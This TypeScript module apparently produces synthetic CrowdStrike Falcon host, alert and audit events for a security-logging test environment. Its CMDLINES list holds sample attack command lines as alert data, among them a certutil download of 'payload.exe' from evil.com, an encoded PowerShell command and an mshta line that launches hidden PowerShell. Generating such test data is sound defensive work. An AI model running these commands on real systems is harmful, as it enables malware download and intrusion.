/**
 * CrowdStrike Falcon Integration
 * Generates host inventory and alert/detection documents
 */

import { BaseIntegration, IntegrationDocument, DataStreamConfig } from './base_integration';
import { Organization, CorrelationMap, Employee, Device } from '../types';
import { faker } from '@faker-js/faker';
import { MALWARE_HASHES } from '../data/threat_intel_data';

/**
 * MITRE ATT&CK tactics and techniques for alerts
 */
const MITRE_ATTACKS = [
  { tactic: 'Initial Access', tacticId: 'TA0001', technique: 'Phishing', techniqueId: 'T1566' },
  {
    tactic: 'Execution',
    tacticId: 'TA0002',
    technique: 'Command and Scripting Interpreter',
    techniqueId: 'T1059',
  },
  {
    tactic: 'Persistence',
    tacticId: 'TA0003',
    technique: 'Registry Run Keys',
    techniqueId: 'T1547.001',
  },
  {
    tactic: 'Privilege Escalation',
    tacticId: 'TA0004',
    technique: 'Process Injection',
    techniqueId: 'T1055',
  },
  {
    tactic: 'Defense Evasion',
    tacticId: 'TA0005',
    technique: 'Obfuscated Files',
    techniqueId: 'T1027',
  },
  {
    tactic: 'Credential Access',
    tacticId: 'TA0006',
    technique: 'OS Credential Dumping',
    techniqueId: 'T1003',
  },
  {
    tactic: 'Discovery',
    tacticId: 'TA0007',
    technique: 'System Information Discovery',
    techniqueId: 'T1082',
  },
  {
    tactic: 'Lateral Movement',
    tacticId: 'TA0008',
    technique: 'Remote Services',
    techniqueId: 'T1021',
  },
  {
    tactic: 'Collection',
    tacticId: 'TA0009',
    technique: 'Archive Collected Data',
    techniqueId: 'T1560',
  },
  {
    tactic: 'Command and Control',
    tacticId: 'TA0011',
    technique: 'Application Layer Protocol',
    techniqueId: 'T1071',
  },
];

const ALERT_NAMES = [
  'Suspicious PowerShell Execution',
  'Malicious Document Detected',
  'Potentially Unwanted Program',
  'Credential Theft Tool Detected',
  'Suspicious Network Connection',
  'Process Injection Detected',
  'Ransomware Behavior Detected',
  'Adware/PUP Detected',
  'Unauthorized Software Installation',
  'Suspicious Script Execution',
  'Fileless Malware Detected',
  'Known Malware Hash Match',
];

const SUSPICIOUS_PROCESSES = [
  { name: 'powershell.exe', path: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\' },
  { name: 'cmd.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'wscript.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'cscript.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'mshta.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'certutil.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'rundll32.exe', path: 'C:\\Windows\\System32\\' },
  { name: 'regsvr32.exe', path: 'C:\\Windows\\System32\\' },
];

const CMDLINES = [
  'powershell.exe -encodedcommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA...',
  'cmd.exe /c whoami /all',
  'certutil.exe -urlcache -split -f http://evil.com/payload.exe',
  'wscript.exe //b //nologo C:\\Users\\Public\\update.vbs',
  'rundll32.exe javascript:"\\..\\mshtml,RunHTMLApplication"',
  'powershell.exe -ep bypass -file C:\\temp\\script.ps1',
  'cmd.exe /c net user /domain',
  'mshta.exe vbscript:Execute("CreateObject(""Wscript.Shell"").Run ""powershell"", 0")',
];

const CS_AGENT_VERSION = '7.10.18305.0';
const CS_CID = 'a1b2c3d4e5f6a7b8c9d0e1f2a3b4c5d6';

type FalconEventType =
  | 'DetectionSummaryEvent'
  | 'RemoteResponseSessionStartEvent'
  | 'RemoteResponseSessionEndEvent'
  | 'AuthActivityAuditEvent'
  | 'UserActivityAuditEvent'
  | 'FirewallMatchEvent'
  | 'IncidentSummaryEvent';

const FALCON_EVENT_WEIGHTS: Array<{ value: FalconEventType; weight: number }> = [
  { value: 'DetectionSummaryEvent', weight: 30 },
  { value: 'RemoteResponseSessionStartEvent', weight: 10 },
  { value: 'RemoteResponseSessionEndEvent', weight: 10 },
  { value: 'AuthActivityAuditEvent', weight: 20 },
  { value: 'UserActivityAuditEvent', weight: 15 },
  { value: 'FirewallMatchEvent', weight: 10 },
  { value: 'IncidentSummaryEvent', weight: 5 },
];

const AUTH_OPERATIONS = [
  'userAuthenticate',
  'twoFactorAuthenticate',
  'apiClientAuthenticate',
  'resetPassword',
  'grantUserRoles',
  'revokeUserRoles',
];

const USER_ACTIVITY_OPERATIONS = [
  'createUser',
  'updateUserDefinition',
  'deleteUser',
  'createGroup',
  'updateGroupMembers',
  'updatePolicy',
  'updatePreventionPolicy',
  'createAPIClient',
  'revokeAPIClient',
];

const FIREWALL_RULE_ACTIONS = ['allow', 'block', 'monitor'];
const FIREWALL_PROTOCOLS = ['TCP', 'UDP', 'ICMP'];
const FIREWALL_POLICIES = [
  'Default Workstation Policy',
  'Restrictive Server Policy',
  'Developer Workstation Policy',
  'Standard Endpoint Policy',
];

/**
 * CrowdStrike Integration
 */
export class CrowdStrikeIntegration extends BaseIntegration {
  readonly packageName = 'crowdstrike';
  readonly displayName = 'CrowdStrike Falcon';

  readonly dataStreams: DataStreamConfig[] = [
    { name: 'host', index: 'logs-crowdstrike.host-default' },
    { name: 'alert', index: 'logs-crowdstrike.alert-default' },
    { name: 'falcon', index: 'logs-crowdstrike.falcon-default' },
  ];

  generateDocuments(
    org: Organization,
    correlationMap: CorrelationMap
  ): Map<string, IntegrationDocument[]> {
    const documentsMap = new Map<string, IntegrationDocument[]>();
    const hostDocs: IntegrationDocument[] = [];
    const alertDocs: IntegrationDocument[] = [];

    // Generate host inventory documents (one per laptop device)
    for (const [_agentId, { employee, device }] of correlationMap.crowdstrikeAgentIdToDevice) {
      // Only laptops get CrowdStrike agents (not mobile)
      if (device.type !== 'laptop') continue;

      hostDocs.push(this.generateHostDocument(employee, device));
    }

    // Generate alerts (2-5% of devices)
    const laptopEntries = [...correlationMap.crowdstrikeAgentIdToDevice.entries()].filter(
      ([, { device }]) => device.type === 'laptop'
    );
    const alertCount = Math.max(
      1,
      Math.floor(laptopEntries.length * faker.number.float({ min: 0.02, max: 0.05 }))
    );
    const alertDevices = faker.helpers.arrayElements(laptopEntries, alertCount);

    for (const [, { employee, device }] of alertDevices) {
      alertDocs.push(this.generateAlertDocument(employee, device));
    }

    const falconDocs = this.generateFalconDocuments(correlationMap);

    documentsMap.set('logs-crowdstrike.host-default', hostDocs);
    documentsMap.set('logs-crowdstrike.alert-default', alertDocs);
    documentsMap.set('logs-crowdstrike.falcon-default', falconDocs);
    return documentsMap;
  }

  private generateHostDocument(employee: Employee, device: Device): IntegrationDocument {
    const platform = this.mapPlatform(device.platform);
    const osVersion = this.mapOsVersion(device.platform);
    const firstSeen = faker.date.past({ years: 2 }).toISOString();
    const modifiedTimestamp = this.getTimestamp();

    // Build raw CrowdStrike Falcon API host object
    // The ingest pipeline will parse this JSON and map all fields to ECS
    const rawHost = {
      device_id: device.crowdstrikeDeviceId,
      cid: CS_CID,
      hostname: `${employee.userName}-${device.platform}`,
      local_ip: device.ipAddress,
      external_ip: faker.internet.ipv4(),
      mac_address: device.macAddress.toLowerCase(),
      os_version: osVersion,
      platform_name: platform,
      platform_id: this.mapPlatformId(device.platform),
      agent_version: CS_AGENT_VERSION,
      agent_local_time: this.getTimestamp(),
      status: 'normal',
      provision_status: 'Provisioned',
      serial_number: device.serialNumber,
      system_manufacturer: this.mapManufacturer(device),
      system_product_name: device.displayName,
      device_policies: {
        prevention: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'prevention',
        },
        sensor_update: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'sensor-update',
        },
        device_control: {
          policy_id: faker.string.uuid(),
          applied: true,
          policy_type: 'device-control',
        },
      },
      groups: [employee.department.replace(/ & /g, '-').toLowerCase()],
      first_seen: firstSeen,
      last_seen: this.getRandomTimestamp(2),
      modified_timestamp: modifiedTimestamp,
      product_type_desc: 'Workstation',
    };

    return {
      // @timestamp is required by IntegrationDocument type but the pipeline
      // will overwrite it from modified_timestamp
      '@timestamp': modifiedTimestamp,
      message: JSON.stringify(rawHost),
      data_stream: { namespace: 'default', type: 'logs', dataset: 'crowdstrike.host' },
      tags: ['forwarded', 'crowdstrike-host'],
    } as IntegrationDocument;
  }

  private generateAlertDocument(employee: Employee, device: Device): IntegrationDocument {
    const mitre = faker.helpers.arrayElement(MITRE_ATTACKS);
    const alertName = faker.helpers.arrayElement(ALERT_NAMES);
    const process = faker.helpers.arrayElement(SUSPICIOUS_PROCESSES);
    const cmdline = faker.helpers.arrayElement(CMDLINES);
    const severity = faker.helpers.weightedArrayElement([
      { value: 2, weight: 40 },
      { value: 3, weight: 35 },
      { value: 4, weight: 20 },
      { value: 5, weight: 5 },
    ]);
    const severityName = ['', '', 'Low', 'Medium', 'High', 'Critical'][severity];
    const sha256 = faker.helpers.arrayElement(MALWARE_HASHES);
    const prevented = severity < 5 ? faker.datatype.boolean(0.8) : faker.datatype.boolean(0.5);
    const alertTimestamp = this.getRandomTimestamp(48);
    const alertId = `ind:${device.crowdstrikeAgentId}:${faker.string.numeric(12)}-${faker.string.numeric(4)}-${faker.string.numeric(8)}`;
    const processId = faker.string.numeric(12);
    const parentProcessId = faker.string.numeric(12);

    // Build raw CrowdStrike Falcon API alert object
    // The ingest pipeline will parse this JSON and map all fields to ECS
    const rawAlert: Record<string, unknown> = {
      id: alertId,
      cid: CS_CID,
      agent_id: device.crowdstrikeAgentId,
      name: alertName,
      description: `${alertName} detected on host ${employee.userName}-${device.platform}`,
      severity: severity * 20, // CrowdStrike API uses 0-100 scale
      severity_name: severityName.toLowerCase(),
      confidence: faker.number.int({ min: 50, max: 100 }),
      tactic: mitre.tactic,
      tactic_id: mitre.tacticId,
      technique: mitre.technique,
      technique_id: mitre.techniqueId,
      device: {
        device_id: device.crowdstrikeDeviceId,
        hostname: `${employee.userName}-${device.platform}`,
        platform_name: this.mapPlatform(device.platform),
        platform_id: this.mapPlatformId(device.platform),
        os_version: this.mapOsVersion(device.platform),
        local_ip: device.ipAddress,
        external_ip: faker.internet.ipv4(),
        agent_version: CS_AGENT_VERSION,
        system_manufacturer: this.mapManufacturer(device),
        system_product_name: device.displayName,
        status: 'normal',
      },
      cmdline,
      filename: process.name,
      filepath: `\\Device\\HarddiskVolume3\\${process.path.replace(/^C:\\/, '')}${process.name}`,
      sha256,
      process_id: processId,
      process_start_time: new Date(alertTimestamp).getTime(),
      parent_details: {
        cmdline: 'C:\\WINDOWS\\Explorer.EXE',
        filename: 'explorer.exe',
        filepath: '\\Device\\HarddiskVolume3\\Windows\\explorer.exe',
        process_id: parentProcessId,
        sha256: faker.string.hexadecimal({ length: 64, casing: 'lower', prefix: '' }),
        user_name: employee.userName,
      },
      user_name: employee.userName,
      prevented: String(prevented),
      pattern_disposition: prevented ? 2048 : 0,
      pattern_disposition_description: prevented
        ? 'Prevention/Quarantine, process was blocked from execution and quarantine was attempted.'
        : 'Detection only, no preventive action taken.',
      pattern_disposition_details: {
        detect: !prevented,
        process_blocked: prevented,
        quarantine_file: prevented && faker.datatype.boolean(0.7),
        kill_process: false,
        kill_parent: false,
        kill_subprocess: false,
        operation_blocked: false,
        indicator: false,
        sensor_only: false,
        policy_disabled: false,
        kill_action_failed: false,
        blocking_unsupported_or_disabled: false,
        suspend_process: false,
        suspend_parent: false,
        quarantine_machine: false,
        rooting: false,
        critical_process_disabled: false,
        fs_operation_blocked: false,
        handle_operation_downgraded: false,
        bootup_safeguard_enabled: false,
        inddet_mask: false,
        registry_operation_blocked: false,
      },
      timestamp: alertTimestamp,
      created_timestamp: alertTimestamp,
      updated_timestamp: this.getTimestamp(),
      status: 'new',
      scenario: 'NGAV',
      product: 'epp',
      objective: 'FalconDetectionMethod',
      show_in_ui: true,
      data_domains: ['Endpoint'],
      source_products: ['FalconInsight'],
      source_vendors: ['CrowdStrike'],
    };

    return {
      // @timestamp is required by IntegrationDocument type but the pipeline
      // will overwrite it from timestamp
      '@timestamp': alertTimestamp,
      message: JSON.stringify(rawAlert),
      data_stream: { namespace: 'default', type: 'logs', dataset: 'crowdstrike.alert' },
      tags: ['forwarded', 'crowdstrike-alert'],
    } as IntegrationDocument;
  }

  private mapPlatform(platform: string): string {
    const map: Record<string, string> = { mac: 'Mac', windows: 'Windows', linux: 'Linux' };
    return map[platform] || platform;
  }

  private mapPlatformId(platform: string): string {
    const map: Record<string, string> = { mac: '1', windows: '0', linux: '3' };
    return map[platform] || '0';
  }

  private mapOsVersion(platform: string): string {
    const map: Record<string, string> = { mac: '14.2.1', windows: '10.0.22621', linux: '6.5.0' };
    return map[platform] || '1.0';
  }

  private mapManufacturer(device: Device): string {
    if (device.platform === 'mac') return 'Apple Inc.';
    if (device.displayName.includes('Dell')) return 'Dell Inc.';
    if (device.displayName.includes('Lenovo')) return 'Lenovo';
    if (device.displayName.includes('HP')) return 'HP Inc.';
    if (device.displayName.includes('Surface')) return 'Microsoft Corporation';
    if (device.displayName.includes('System76')) return 'System76';
    return 'Unknown';
  }

  private generateFalconDocuments(correlationMap: CorrelationMap): IntegrationDocument[] {
    const falconDocs: IntegrationDocument[] = [];
    let offset = 0;

    for (const [, { employee, device }] of correlationMap.crowdstrikeAgentIdToDevice) {
      if (device.type !== 'laptop') continue;

      const eventCount = faker.number.int({ min: 3, max: 8 });
      for (let i = 0; i < eventCount; i++) {
        const eventType = faker.helpers.weightedArrayElement(FALCON_EVENT_WEIGHTS);
        offset++;
        falconDocs.push(this.generateFalconEvent(eventType, employee, device, offset));
      }
    }

    return falconDocs;
  }

  private generateFalconEvent(
    eventType: FalconEventType,
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    switch (eventType) {
      case 'DetectionSummaryEvent':
        return this.generateDetectionSummaryEvent(employee, device, offset);
      case 'RemoteResponseSessionStartEvent':
        return this.generateRemoteResponseStartEvent(employee, device, offset);
      case 'RemoteResponseSessionEndEvent':
        return this.generateRemoteResponseEndEvent(employee, device, offset);
      case 'AuthActivityAuditEvent':
        return this.generateAuthAuditEvent(employee, offset);
      case 'UserActivityAuditEvent':
        return this.generateUserActivityAuditEvent(employee, offset);
      case 'FirewallMatchEvent':
        return this.generateFirewallMatchEvent(employee, device, offset);
      case 'IncidentSummaryEvent':
        return this.generateIncidentSummaryEvent(employee, device, offset);
    }
  }

  private buildFalconDoc(
    eventType: string,
    rawEvent: Record<string, unknown>,
    offset: number,
    ecsOverrides: Record<string, unknown>
  ): IntegrationDocument {
    const metadata = {
      customerIDString: CS_CID,
      eventType,
      offset,
      version: '1.0',
    };
    const eventCreationTime = ecsOverrides['@timestamp'] as string;
    const rawEnvelope = {
      event: rawEvent,
      metadata: { ...metadata, eventCreationTime: new Date(eventCreationTime).getTime() },
    };

    return {
      '@timestamp': eventCreationTime,
      crowdstrike: { event: rawEvent, metadata },
      data_stream: { dataset: 'crowdstrike.falcon', namespace: 'default', type: 'logs' },
      event: {
        kind: 'event',
        original: JSON.stringify(rawEnvelope),
        ...(ecsOverrides.event as Record<string, unknown>),
      },
      observer: { product: 'Falcon', vendor: 'Crowdstrike' },
      tags: ['preserve_original_event', 'forwarded', 'crowdstrike-falcon'],
      ...(ecsOverrides.message ? { message: ecsOverrides.message } : {}),
      ...(ecsOverrides.user ? { user: ecsOverrides.user } : {}),
      ...(ecsOverrides.host ? { host: ecsOverrides.host } : {}),
      ...(ecsOverrides.process ? { process: ecsOverrides.process } : {}),
      ...(ecsOverrides.threat ? { threat: ecsOverrides.threat } : {}),
      ...(ecsOverrides.file ? { file: ecsOverrides.file } : {}),
      ...(ecsOverrides.source ? { source: ecsOverrides.source } : {}),
      ...(ecsOverrides.destination ? { destination: ecsOverrides.destination } : {}),
      ...(ecsOverrides.related ? { related: ecsOverrides.related } : {}),
    } as IntegrationDocument;
  }

  private generateDetectionSummaryEvent(
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    const mitre = faker.helpers.arrayElement(MITRE_ATTACKS);
    const proc = faker.helpers.arrayElement(SUSPICIOUS_PROCESSES);
    const cmdline = faker.helpers.arrayElement(CMDLINES);
    const sha256 = faker.helpers.arrayElement(MALWARE_HASHES);
    const md5 = faker.string.hexadecimal({ length: 32, casing: 'lower', prefix: '' });
    const sha1 = faker.string.hexadecimal({ length: 40, casing: 'lower', prefix: '' });
    const severity = faker.helpers.weightedArrayElement([
      { value: 2, weight: 40 },
      { value: 3, weight: 35 },
      { value: 4, weight: 20 },
      { value: 5, weight: 5 },
    ]);
    const severityName = ['', '', 'Low', 'Medium', 'High', 'Critical'][severity];
    const hostname = `${employee.userName}-${device.platform}`;
    const timestamp = this.getRandomTimestamp(48);
    const processId = faker.number.int({ min: 1000, max: 65535 });
    const parentProcessId = faker.number.int({ min: 100, max: 999 });
    const detectId = `ldt:${device.crowdstrikeAgentId}:${faker.string.numeric(18)}`;

    const rawEvent: Record<string, unknown> = {
      AgentIdString: device.crowdstrikeAgentId,
      ComputerName: hostname,
      DetectId: detectId,
      DetectName: faker.helpers.arrayElement(ALERT_NAMES),
      UserName: employee.userName,
      FileName: proc.name,
      FilePath: `${proc.path}${proc.name}`,
      CommandLine: cmdline,
      SHA256String: sha256,
      MD5String: md5,
      SHA1String: sha1,
      Severity: severity,
      SeverityName: severityName,
      LocalIP: device.ipAddress,
      MACAddress: device.macAddress.toLowerCase(),
      MachineDomain: employee.email.split('@')[1],
      ProcessId: processId,
      ParentProcessId: parentProcessId,
      ParentImageFilePath: 'C:\\Windows\\explorer.exe',
      GrandparentImageFilePath: 'C:\\Windows\\System32\\userinit.exe',
      PatternDispositionValue: faker.helpers.arrayElement([0, 16, 2048]),
      Objective: 'FalconDetectionMethod',
      FalconHostLink: `https://falcon.crowdstrike.com/activity/detections/detail/${device.crowdstrikeAgentId}/${detectId}`,
    };

    return this.buildFalconDoc('DetectionSummaryEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: `Detection: ${rawEvent.DetectName} on ${hostname}`,
      event: {
        action: ['detection_summary_event'],
        category: ['malware'],
        type: ['info'],
        severity: severity,
      },
      host: { name: hostname },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
      },
      process: {
        pid: processId,
        name: proc.name,
        executable: `${proc.path}${proc.name}`,
        command_line: cmdline,
        parent: {
          pid: parentProcessId,
          executable: 'C:\\Windows\\explorer.exe',
        },
      },
      file: {
        hash: { sha256, md5, sha1 },
      },
      threat: {
        framework: 'MITRE ATT&CK',
        tactic: { name: mitre.tactic, id: mitre.tacticId },
        technique: { name: mitre.technique, id: mitre.techniqueId },
      },
      related: {
        user: [employee.userName, employee.email],
        hosts: [hostname],
        hash: [sha256, md5, sha1],
        ip: [device.ipAddress],
      },
    });
  }

  private generateRemoteResponseStartEvent(
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    const hostname = `${employee.userName}-${device.platform}`;
    const timestamp = this.getRandomTimestamp(24);
    const sessionId = faker.string.uuid();

    const rawEvent: Record<string, unknown> = {
      AgentIdString: device.crowdstrikeAgentId,
      SessionId: sessionId,
      HostnameField: hostname,
      UserName: employee.email,
      StartTimestamp: Math.floor(new Date(timestamp).getTime() / 1000),
    };

    return this.buildFalconDoc('RemoteResponseSessionStartEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: 'Remote response session started.',
      event: {
        action: ['remote_response_session_start_event'],
        category: ['network', 'session'],
        type: ['start'],
        start: timestamp,
      },
      host: { name: hostname },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
      },
      related: {
        user: [employee.userName, employee.email],
        hosts: [hostname],
      },
    });
  }

  private generateRemoteResponseEndEvent(
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    const hostname = `${employee.userName}-${device.platform}`;
    const timestamp = this.getRandomTimestamp(24);
    const sessionId = faker.string.uuid();
    const durationSec = faker.number.int({ min: 30, max: 3600 });
    const endTimestamp = new Date(new Date(timestamp).getTime() + durationSec * 1000).toISOString();

    const rawEvent: Record<string, unknown> = {
      AgentIdString: device.crowdstrikeAgentId,
      SessionId: sessionId,
      HostnameField: hostname,
      UserName: employee.email,
      StartTimestamp: Math.floor(new Date(timestamp).getTime() / 1000),
      EndTimestamp: Math.floor(new Date(endTimestamp).getTime() / 1000),
      Commands: faker.helpers.arrayElements(
        ['ls', 'ps', 'netstat', 'cat /etc/hosts', 'reg query', 'get-process'],
        { min: 1, max: 3 }
      ),
    };

    return this.buildFalconDoc('RemoteResponseSessionEndEvent', rawEvent, offset, {
      '@timestamp': endTimestamp,
      message: 'Remote response session ended.',
      event: {
        action: ['remote_response_session_end_event'],
        category: ['network', 'session'],
        type: ['end'],
        start: timestamp,
        end: endTimestamp,
      },
      host: { name: hostname },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
      },
      related: {
        user: [employee.userName, employee.email],
        hosts: [hostname],
      },
    });
  }

  private generateAuthAuditEvent(employee: Employee, offset: number): IntegrationDocument {
    const timestamp = this.getRandomTimestamp(24);
    const operation = faker.helpers.arrayElement(AUTH_OPERATIONS);
    const success = faker.datatype.boolean(0.85);

    const rawEvent: Record<string, unknown> = {
      UserId: employee.email,
      UserUUID: faker.string.uuid(),
      OperationName: operation,
      ServiceName: 'CrowdStrike Authentication',
      Success: success,
      AuditKeyValues: [
        { Key: 'action_target', ValueString: employee.email },
        { Key: 'trace_id', ValueString: faker.string.uuid() },
      ],
    };

    return this.buildFalconDoc('AuthActivityAuditEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: `Auth audit: ${operation} by ${employee.email} (${success ? 'success' : 'failure'})`,
      event: {
        action: ['auth_activity_audit_event'],
        category: ['authentication'],
        type: ['info'],
        outcome: success ? 'success' : 'failure',
      },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
        id: employee.email,
      },
      related: {
        user: [employee.userName, employee.email],
      },
    });
  }

  private generateUserActivityAuditEvent(employee: Employee, offset: number): IntegrationDocument {
    const timestamp = this.getRandomTimestamp(24);
    const operation = faker.helpers.arrayElement(USER_ACTIVITY_OPERATIONS);
    const success = faker.datatype.boolean(0.95);

    const rawEvent: Record<string, unknown> = {
      UserId: employee.email,
      UserUUID: faker.string.uuid(),
      OperationName: operation,
      ServiceName: 'CrowdStrike User Management',
      Success: success,
      AuditKeyValues: [
        { Key: 'target_name', ValueString: faker.internet.email() },
        { Key: 'trace_id', ValueString: faker.string.uuid() },
      ],
    };

    return this.buildFalconDoc('UserActivityAuditEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: `User activity: ${operation} by ${employee.email}`,
      event: {
        action: ['user_activity_audit_event'],
        category: ['iam'],
        type: ['info'],
        outcome: success ? 'success' : 'failure',
      },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
        id: employee.email,
      },
      related: {
        user: [employee.userName, employee.email],
      },
    });
  }

  private generateFirewallMatchEvent(
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    const hostname = `${employee.userName}-${device.platform}`;
    const timestamp = this.getRandomTimestamp(24);
    const protocol = faker.helpers.arrayElement(FIREWALL_PROTOCOLS);
    const ruleAction = faker.helpers.arrayElement(FIREWALL_RULE_ACTIONS);
    const localPort = faker.internet.port();
    const remotePort = faker.helpers.arrayElement([80, 443, 8080, 3389, 22, 445, 53]);
    const remoteIp = faker.internet.ipv4();

    const rawEvent: Record<string, unknown> = {
      AgentIdString: device.crowdstrikeAgentId,
      ComputerName: hostname,
      Protocol: protocol,
      LocalAddress: device.ipAddress,
      LocalPort: localPort,
      RemoteAddress: remoteIp,
      RemotePort: remotePort,
      RuleAction: ruleAction,
      PolicyName: faker.helpers.arrayElement(FIREWALL_POLICIES),
      PolicyID: faker.string.numeric(6),
      MatchCount: faker.number.int({ min: 1, max: 50 }),
      MatchCountSinceLastReport: faker.number.int({ min: 1, max: 10 }),
      NetworkProfile: 'Private',
      Timestamp: Math.floor(new Date(timestamp).getTime() / 1000),
      'Flags.Audit': true,
      'Flags.Log': true,
      'Flags.Monitor': ruleAction === 'monitor',
      TreeID: faker.string.hexadecimal({ length: 16, casing: 'lower', prefix: '' }),
      Status: ruleAction === 'block' ? 'blocked' : 'allowed',
    };

    return this.buildFalconDoc('FirewallMatchEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: `Firewall ${ruleAction}: ${protocol} ${device.ipAddress}:${localPort} -> ${remoteIp}:${remotePort}`,
      event: {
        action: ['firewall_match_event'],
        category: ['network'],
        type: ['connection'],
      },
      host: { name: hostname },
      source: { ip: device.ipAddress, port: localPort },
      destination: { ip: remoteIp, port: remotePort },
      related: {
        hosts: [hostname],
        ip: [device.ipAddress, remoteIp],
      },
    });
  }

  private generateIncidentSummaryEvent(
    employee: Employee,
    device: Device,
    offset: number
  ): IntegrationDocument {
    const hostname = `${employee.userName}-${device.platform}`;
    const timestamp = this.getRandomTimestamp(48);
    const fineScore = faker.number.int({ min: 10, max: 100 });
    const severity = fineScore >= 75 ? 5 : fineScore >= 50 ? 4 : fineScore >= 25 ? 3 : 2;

    const rawEvent: Record<string, unknown> = {
      AgentIdString: device.crowdstrikeAgentId,
      ComputerName: hostname,
      IncidentType: faker.helpers.arrayElement(['1', '2', '3']),
      FineScore: fineScore,
      State: faker.helpers.arrayElement(['open', 'closed', 'in_progress', 'reopened']),
      LateralMovement: faker.helpers.arrayElement([0, 1]),
      NumbersOfAlerts: faker.number.int({ min: 1, max: 15 }),
      NumberOfCompromisedEntities: faker.number.int({ min: 1, max: 5 }),
      UserName: employee.userName,
    };

    return this.buildFalconDoc('IncidentSummaryEvent', rawEvent, offset, {
      '@timestamp': timestamp,
      message: `Incident on ${hostname}: score ${fineScore}, state ${rawEvent.State}`,
      event: {
        action: ['incident_summary_event'],
        category: ['malware'],
        type: ['info'],
        severity,
      },
      host: { name: hostname },
      user: {
        name: employee.userName,
        email: employee.email,
        domain: employee.email.split('@')[1],
      },
      related: {
        user: [employee.userName, employee.email],
        hosts: [hostname],
      },
    });
  }
}
